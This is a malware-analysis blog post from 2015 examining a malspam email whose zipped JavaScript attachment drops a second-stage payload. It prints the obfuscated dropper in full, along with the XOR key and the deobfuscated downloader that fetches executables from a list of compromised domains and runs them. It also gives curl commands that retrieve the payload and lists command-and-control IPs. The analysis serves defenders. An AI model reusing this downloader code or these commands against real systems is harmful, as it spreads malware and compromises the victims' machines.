---
layout: post
title: "More Emails With Malicious JavaScript Attachments"
date: 2015-08-11 19:44:56 -0500
comments: true
categories: [Malspam, Malware Analysis, Threat Intel] 
---

Slightly late but I ran into another malicious JavaScript attachment that appears to be downloading something besides Ransomware. From automated sandbox analysis it seems to be a Rovnix variant but I am not so sure. I plan to do a little more OSINT and provide an update but here is my analysis for now.

<!--more-->

#### Email Indicators
	Received: from 1487.vanager.de (1487.vanager.de [195.225.105.38])
	From: "Sofia Gallo" <a.scelerisque.sed@mollisDuissit.edu>
	To: REDACTED
	Subject: Attention! Reservation change.
	Date: Sat, 8 Aug 2015
	Attachment: Photo_8739.zip -> IMG_7099.js
---
#### Message Body
	I wanted to change a reservation!
	Because some friends canceled, I would like to change reservation to two
	double room!

	Details of changes in attachment.
	Thanks!

### Deobfuscating the JavaScript
There are a few subtle differences in this weeks example that make it different from the campaign we saw last week. Besides the actual malware being delivered, this file is not a double dot extension like last week where the file ended as `.doc.js`. The obfuscation is also slightly different because we didn't have to tweak the original code in order to see the function it builds for evaluation. The deobfuscated function also contains an array of domains that the script attempts to download 1 of 2 payloads (pdf or exe).

```javascript  IMG_7099.js
// Key to deobfuscate
var key = 'eKTHj9DZ';

// Obfuscated function
var b = '\x03>:+\x1eP+4E,;:\x1fMl?L0")\x18\x190gGz`e\x27x\x17\x15*\x06z\x0b%td\x10)\x02\x1a\x039t\x17t&\x04\x19h)q\x01\x1b5\x19\x1d\x12/j\x09\x09K\x08\x1b\x05J|\x08\x1f(\x0e\x1a\x1c-l\x09\x080\x00z\x0b%tk6\x04%3=\x0b^!z,\x09\x19\x0c+m\x05\x19$\x1bz\x0b%tk-\x15f7\x27\x04M!4\x11d  \x0fT!)J*7)\x0e\x5c)#E\x1c\x11\x04&w\x01\x096\x03\x11\x1a(x\x08t&\x04\x19g\x1dIi9\x0a% -\x04Mk.\x0d.9-\x19\x1603\x0b2y.\x18X)?\x12$&#Jp\x10\x09(\x12\x00\x0d+\x17\x07\x15(d,%\x06K49E<#?Du\x05\x14!\x1f\x1b\x1d8s\x05\x0a$\x05z\x0b%td\x13+\x1f\x11\x0f8p\x10\x036\x06\x07\x06-\x17\x07\x15(k\x17\x1a/x\x10\x133\x0e\x12\x07%}\x17\x0e<\x07\x1d\x1b>\x17\x07\x15(k#?\x1d\x17\x0f\x17!\x0e\x06\x1d$s\x01\x0d \x07\x06\x11Dz\x0b\x17E\x0a\x10\x0d$`\x05\x151\x0e\x18\x0d/mj\x19*\x06t\x05+s\x0b\x08&\x0a\x07\x0dDv\x16\x1dE\x02\x07\x1c+w\x06\x0f)\x00\x18\x01\x27xj\x157\x0ct\x0d$m\x0c\x1f)\x1bz\x0b%td\x12 \x0a\x18\x01$~\x17\x0a7\x02\x1a\x0f=v\x16\x116\x03\x1b\x189\x17\x07\x15(d#8GZ+4\x11.:<EM,?\x08.\x27g\x1eK%,\x00\x27y*\x06V#=\x009t\x1c?~\x16\x1b-\x04\x00\x0d&jj\x19*\x06t?\x1dNj<\x09$&!\x0bW&(\x10.:!\x04^j9\x0a&t\x02?x\x08\x0e*\x1c\x11\x1a>k\x0d\x1b+\x0c\x18\x0dDz\x0b\x17E\x06\x15\x09!z\x05\x08!e\x17\x07\x27\x193-\x12e>)\x01P)8\x0a8 f\x1aUd\x0e-\x0e\x02\x01&u\x05\x1d \x1d\x11\x1c/k\x0d\x14$\x19\x0d\x00%j\x14\x131\x0a\x18f)v\x09xK8$$\x03MlxEi}s\x0fAyxGvi-U\x1bj?\x1d.vrH\x174>\x03io.\x05Kl,\x049t\x05W\x09\x7f\x17Y?z$\x0fW#.\x0dp\x19cA\x10?,\x049t&WW!-E\x0a7<\x03O!\x02*)>-\x09Mlx2\x187:\x03I0t6#1$\x06\x1bmv*v:f/A4;\x0b/\x11&\x1cP65\x0b&1&\x1ej0(\x0c%3;B\x1ba\x0e \x06\x04mH\x10o\x09\x119=&\x0d\x17"(\x0a&\x17 \x0bK\x075\x01.|qX\x10o\x17\x04?<f\x18V14\x01ce-R\x13\x09;\x11#z:\x0bW 5\x08c}aA\x5c<v vdd\x18\x04*?\x12k\x15+\x1eP2?=\x046"\x0fZ0rG\x06\x07\x10\x27uvt=\x06\x18\x00>m\x14xLp&f\x05W6?\x04/-;\x1eX0?\x06#5&\x0d\x5cy<\x10%7<\x03V*rL0=.B\x0dyg\x17e&-\x0b]=\x09\x11* -L\x1fvjUvi:DJ0;\x11>\x27a\x11O%(E.i&\x0fNd\x1b\x06?=>\x0fa\x0b8\x0f.7<B\x1b\x05\x1e*\x0f\x16f9M6?\x04&vaQP"r\x00e;8\x0fWlsI.z<\x13I!gTg1f\x1dK-.\x00c&f8\x5c7*\x0a%\x27-(V #Lga-Y\x05!t\x16".-CB\x01gTg1f\x1aV73\x11";&W\x09h?K85>\x0fm+\x1c\x0c\x271`%\x15vs^?&1\x11Wj\x08\x10%|\x07F\x08hjL67)\x1eZ,r\x11b/5\x17\x5cj9\x09$\x27-B\x109\x27^?&1\x11Kj5\x15.:`H~\x01\x0eGgv \x1eM4`Jdvc\x1eb\x09\x07Ni{/\x0fMj*\x0d;k,\x0d_ <\x02vvc\x27X02K95&\x0eV)rL`vn\x01\x5c=gG`?-\x13\x12!vDz}d\x18\x177?\x0b/|a\x17Z%.\x06#|)CB93\x03ceuW|m8\x17.5#\x17D/?\x1cvv._\x1bh=\x0a9!<B\x1bfsI,;:\x1fMlxC;0.WJ!;\x17(<jC\x02';

var _0x12bd = ["", "\x6C\x65\x6E\x67\x74\x68", "\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74", "\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65"];

// Build the function string to be evaluated
for(var dhhas3uu = _0x12bd[0], code = _0x12bd[0], j = 0, i = 0; i < b[_0x12bd[1]]; i++) {
	dhhas3uu += String[_0x12bd[3]](b[_0x12bd[2]](i) ^ key[_0x12bd[2]](j)), j++, j == key[_0x12bd[1]] && (j = 0);
};

// Evaluate the deobfuscated JavaScript
eval(dhhas3uu);
```

```javascript deobfuscated.js
function gorut(e){
	var t = "14-MASOOM.COM JLINKSMS.COM CHEAPRIZESMS.COM ELEMENTGUMRUK[.]COM/language IBMDATACAP[.]COM/wp-content/themes/academy WELLNESSHERBAL[.]COM/wp-content/themes/tiny-framework ITSMYTEA[.]COM/xmlrpc www.LANDTOURJAPAN[.]COM INTEGRITYSMSNG[.]COM CREATIVEFOODSTYLIST[.]COM www.KMDERUNJEWELRY[.]COM ADENYAOTELEET[.]COM MAJORCASE[.]ORG ISTANBULKLIMA[.]ORG ENTHELP[.]COM HEALINGSPRINGWORKSHOPS[.]COM/wp-content/themes/travel-blogger TUGRAHOTELS[.]COM www.florianbruening[.]com JUALTOWERTRIANGLE[.]COM MAAKCARD[.]COM www.jakimbost[.]pl THEVILLAGEVETERINARYHOSPITAL[.]COM".split(" ");

	ex = "" == e ? ".exe" : ".pdf";

	for(var M = 0; M < t.length; M++) {
		var n = new ActiveXObject("WScript.Shell"), O = n.ExpandEnvironmentStrings("%TEMP%") + String.fromCharCode(92) + Math.round(100000000.0 * Math.random()) + ex, E = 0, r = new ActiveXObject("MSXML2.XMLHTTP");
		r.onreadystatechange = function() {
			if(4 == r.readyState && 200 == r.status) {
				var e = new ActiveXObject("ADODB.Stream");
				if(e.open(), e.type = 1, e.write(r.ResponseBody), 5000.0 < e.size) {
					E = 1, e.position = 0, e.saveToFile(O, 2);
					try {
						n.Run(O, 1, 0);
					} catch(t) {

					}
				}
				e.close();
			}
		};
		try {
			r.open("GET", "hxxp://" + t[M] + "/get.php?dgfdfg=" + Math.random() + "&key=" + key + e, !1), r.send();
		} catch(a) {

		}
		if(1 == E) break;
	}
}

key = "f5", gorut(""), gorut("&pdf=search");
```
Removing a few lines in `gorut()` routine of the download script allows to print out download links for the two payloads it attempts to get. Basically you need to remove the ActiveX code and modify `r.open` to `console.log` function removing the `!1` parameter. Running this in node.js will give us a list of payload downloads for the second stage.

```javascript modified_function.js
function gorut(e){
	var t = "14-MASOOM.COM JLINKSMS.COM CHEAPRIZESMS.COM ELEMENTGUMRUK[.]COM/language IBMDATACAP[.]COM/wp-content/themes/academy WELLNESSHERBAL[.]COM/wp-content/themes/tiny-framework ITSMYTEA[.]COM/xmlrpc www.LANDTOURJAPAN[.]COM INTEGRITYSMSNG[.]COM CREATIVEFOODSTYLIST[.]COM www.KMDERUNJEWELRY[.]COM ADENYAOTELEET[.]COM MAJORCASE[.]ORG ISTANBULKLIMA[.]ORG ENTHELP[.]COM HEALINGSPRINGWORKSHOPS[.]COM/wp-content/themes/travel-blogger TUGRAHOTELS[.]COM www.florianbruening[.]com JUALTOWERTRIANGLE[.]COM MAAKCARD[.]COM www.jakimbost[.]pl THEVILLAGEVETERINARYHOSPITAL[.]COM".split(" ");

	ex = "" == e ? ".exe" : ".pdf";
	for(var M = 0; M < t.length; M++) {
		console.log("GET", "hxxp://" + t[M] + "/get.php?dgfdfg=" + Math.random() + "&key=" + key + e);
	}
}
```

#### Payload Links
	GET hxxp://14-MASOOM[.]COM/get.php?dgfdfg=0.2042055584024638&key=f5
	GET hxxp://JLINKSMS[.]COM/get.php?dgfdfg=0.4357860581949353&key=f5
	GET hxxp://CHEAPRIZESMS[.]COM/get.php?dgfdfg=0.9873443075921386&key=f5
	GET hxxp://ELEMENTGUMRUK[.]COM/language/get.php?dgfdfg=0.697707447456196&key=f5
	GET hxxp://IBMDATACAP[.]COM/wp-content/themes/academy/get.php?dgfdfg=0.21713185170665383&key=f5
	GET hxxp://WELLNESSHERBAL[.]COM/wp-content/themes/tiny-framework/get.php?dgfdfg=0.5791356258559972&key=f5
	GET hxxp://ITSMYTEA[.]COM/xmlrpc/get.php?dgfdfg=0.5410346924327314&key=f5
	GET hxxp://www.LANDTOURJAPAN[.]COM/get.php?dgfdfg=0.418818884762004&key=f5
	GET hxxp://INTEGRITYSMSNG[.]COM/get.php?dgfdfg=0.029143808409571648&key=f5
	GET hxxp://CREATIVEFOODSTYLIST[.]COM/get.php?dgfdfg=0.3915193013381213&key=f5
	GET hxxp://www.KMDERUNJEWELRY[.]COM/get.php?dgfdfg=0.07052874471992254&key=f5
	GET hxxp://ADENYAOTELEET[.]COM/get.php?dgfdfg=0.8330098567530513&key=f5
	GET hxxp://MAJORCASE[.]ORG/get.php?dgfdfg=0.5714250793680549&key=f5
	GET hxxp://ISTANBULKLIMA[.]ORG/get.php?dgfdfg=0.6278960527852178&key=f5
	GET hxxp://ENTHELP[.]COM/get.php?dgfdfg=0.48202996351756155&key=f5
	GET hxxp://HEALINGSPRINGWORKSHOPS[.]COM/wp-content/themes/travel-blogger/get.php?dgfdfg=0.2205682178027928&key=f5
	GET hxxp://TUGRAHOTELS[.]COM/get.php?dgfdfg=0.5332026502583176&key=f5
	GET hxxp://www.florianbruening[.]com/get.php?dgfdfg=0.0033856993541121483&key=f5
	GET hxxp://JUALTOWERTRIANGLE[.]COM/get.php?dgfdfg=0.7687414824031293&key=f5
	GET hxxp://MAAKCARD[.]COM/get.php?dgfdfg=0.14662570762448013&key=f5
	GET hxxp://www.jakimbost[.]pl/get.php?dgfdfg=0.4327525827102363&key=f5
	GET hxxp://THEVILLAGEVETERINARYHOSPITAL[.]COM/get.php?dgfdfg=0.48534721904434264&key=f5
	GET hxxp://14-MASOOM[.]COM/get.php?dgfdfg=0.6709314966574311&key=f5&pdf=search
	GET hxxp://JLINKSMS[.]COM/get.php?dgfdfg=0.020113263744860888&key=f5&pdf=search
	GET hxxp://CHEAPRIZESMS[.]COM/get.php?dgfdfg=0.6769137345254421&key=f5&pdf=search
	GET hxxp://ELEMENTGUMRUK[.]COM/language/get.php?dgfdfg=0.1893466750625521&key=f5&pdf=search
	GET hxxp://IBMDATACAP[.]COM/wp-content/themes/academy/get.php?dgfdfg=0.11392477317713201&key=f5&pdf=search
	GET hxxp://WELLNESSHERBAL[.]COM/wp-content/themes/tiny-framework/get.php?dgfdfg=0.7516817327123135&key=f5&pdf=search
	GET hxxp://ITSMYTEA[.]COM/xmlrpc/get.php?dgfdfg=0.45238890522159636&key=f5&pdf=search
	GET hxxp://www.LANDTOURJAPAN[.]COM/get.php?dgfdfg=0.5003419334534556&key=f5&pdf=search
	GET hxxp://INTEGRITYSMSNG[.]COM/get.php?dgfdfg=0.7602681068237871&key=f5&pdf=search
	GET hxxp://CREATIVEFOODSTYLIST[.]COM/get.php?dgfdfg=0.2591306504327804&key=f5&pdf=search
	GET hxxp://www.KMDERUNJEWELRY[.]COM/get.php?dgfdfg=0.19865264417603612&key=f5&pdf=search
	GET hxxp://ADENYAOTELEET[.]COM/get.php?dgfdfg=0.8011750828009099&key=f5&pdf=search
	GET hxxp://MAJORCASE[.]ORG/get.php?dgfdfg=0.7017634396906942&key=f5&pdf=search
	GET hxxp://ISTANBULKLIMA[.]ORG/get.php?dgfdfg=0.33236109651625156&key=f5&pdf=search
	GET hxxp://ENTHELP[.]COM/get.php?dgfdfg=0.25800628517754376&key=f5&pdf=search
	GET hxxp://HEALINGSPRINGWORKSHOPS[.]COM/wp-content/themes/travel-blogger/get.php?dgfdfg=0.4463676530867815&key=f5&pdf=search
	GET hxxp://TUGRAHOTELS[.]COM/get.php?dgfdfg=0.5060989174526185&key=f5&pdf=search
	GET hxxp://www.florianbruening[.]com/get.php?dgfdfg=0.8751774763222784&key=f5&pdf=search
	GET hxxp://JUALTOWERTRIANGLE[.]COM/get.php?dgfdfg=0.08316186326555908&key=f5&pdf=search
	GET hxxp://MAAKCARD[.]COM/get.php?dgfdfg=0.8340241997502744&key=f5&pdf=search
	GET hxxp://www.jakimbost[.]pl/get.php?dgfdfg=0.9773174184374511&key=f5&pdf=search
	GET hxxp://THEVILLAGEVETERINARYHOSPITAL[.]COM/get.php?dgfdfg=0.6214603304397315&key=f5&pdf=search

So now that we have the payload URLs we can download them for further analysis. It attempts to download either a malicious executable or pdf. The URLs without `&pdf=search` on the end are the MS-DOS executables. When attempting to download these I noticed that my curl command was failing with my Firefox user agent (404 page). Switching it to a traditional IE10 user agent allowed me to download the payload. 
  
#### Failed Command
	curl -vA "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0" -L "hxxp://TUGRAHOTELS[.]COM/get.php?dgfdfg=0.5332026502583176&key=f5" > bad_dl.exe
	
	% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
								   Dload  Upload   Total   Spent    Left  Speed
	0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 159.253.42.153...
	Connected to TUGRAHOTELS[.]COM (159.253.42.153) port 80 (#0)
	
	GET /get.php?dgfdfg=0.5332026502583176&key=f5 HTTP/1.1
	User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
	Host: TUGRAHOTELS[.]COM
	Accept: */*
				   
	HTTP/1.1 200 OK
	Content-Type: application/x-msdownload
	Content-Disposition: inline; filename=Adobe_update-YXXQ1RX4IL6LV2M.exe
	Content-Length: 3
	Date: Tue, 11 Aug 2015 21:01:02 GMT
	Accept-Ranges: bytes
	Server LiteSpeed is not blacklisted
	Server: LiteSpeed
	Connection: close
			     
	{ [data not shown]
	100     3  100     3    0     0      2      0  0:00:01  0:00:01 --:--:--     2
	Closing connection 0
 ---
#### Successful Command
	curl -vA "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)" -L "hxxp://TUGRAHOTELS[.]COM/get.php?dgfdfg=0.5332026502583176&key=f5" > bad
	
	% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
								   Dload  Upload   Total   Spent    Left  Speed
	0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 159.253.42.153...
	Connected to TUGRAHOTELS.COM (159.253.42.153) port 80 (#0)
	GET /get.php?dgfdfg=0.5332026502583176&key=f5 HTTP/1.1
	User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)
	Host: TUGRAHOTELS[.]COM
	Accept: */*
	
	HTTP/1.1 200 OK
	Content-Type: application/x-msdownload
	Content-Disposition: inline; filename=Adobe_update-ZLFNDKIGUO7.exe
	Date: Tue, 11 Aug 2015 21:03:35 GMT
	Accept-Ranges: bytes
	Server LiteSpeed is not blacklisted
	Server: LiteSpeed
	Connection: close
	
	{ [data not shown]
	100  214k    0  214k    0     0  89872      0 --:--:--  0:00:02 --:--:-- 89872
	Closing connection 0

Unfortunately, I was only able to get the network indicators below from the executable and none from the pdf file. I am working on beefing up my sandboxing environment to better handle situations like this but until then I will have to leave this post as is for now. Hopefully I can provide an update on the malware family as well as any further OSINT I find. Please feel free to contact me about the analysis or any questions you have.

#### Adobe_update-YXXQ1RX4IL6LV2M.exe Analysis
	GET hxxp://109.120.142.168:80/ac33/b/btc.exe
	GET hxxp://109.120.142.168:80/ac33/p/pc.exe
	GET hxxp://109.120.142.168:80/ac33/g/gc.exe
	GET hxxp://109.120.142.168:80/ac33/bk/bkc.exe
	POST hxxp://109.120.180.29:80/intro/data.php
	Server IP: 109.120.180.29

	GET hxxp://constitution.org:80/usdeclar.txt
	Server IP: 54.175.58.135
